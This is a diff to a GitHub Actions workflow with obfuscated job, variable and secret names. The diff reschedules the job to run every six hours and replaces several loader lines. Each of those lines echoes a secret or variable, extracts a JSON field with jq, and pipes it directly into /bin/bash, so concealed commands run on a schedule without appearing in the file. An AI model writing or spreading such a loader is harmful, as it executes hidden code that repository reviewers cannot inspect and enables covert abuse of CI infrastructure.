@@ -2,20 +2,19 @@ name: yanqing19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '22 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanqing19871010
         env:
-          owgm1708: ${{ secrets.owgm1708 }}
+          pubsx831: ${{ secrets.pubsx831 }}
         run: |
-          echo $owgm1708 | jq -r .lk3116 | /bin/bash
-          echo $u8034 | jq -r .nttee46307 | /bin/bash
-          echo $bz9 | jq -r .ewp94473 | /bin/bash
-          echo $iyr36760 | jq -r .qjji26 | /bin/bash
-          echo $zssmn62 | jq -r .dwbi26 | /bin/bash
-          echo $tdpaf6758 | jq -r .vwiiv601 | /bin/bash
+          echo $pubsx831 | jq -r .dkhgb12221 | /bin/bash
+          echo $cri4 | jq -r .ko9 | /bin/bash
+          echo $n9265 | jq -r .pafjv8 | /bin/bash
+          echo $v0524 | jq -r .r50 | /bin/bash
 
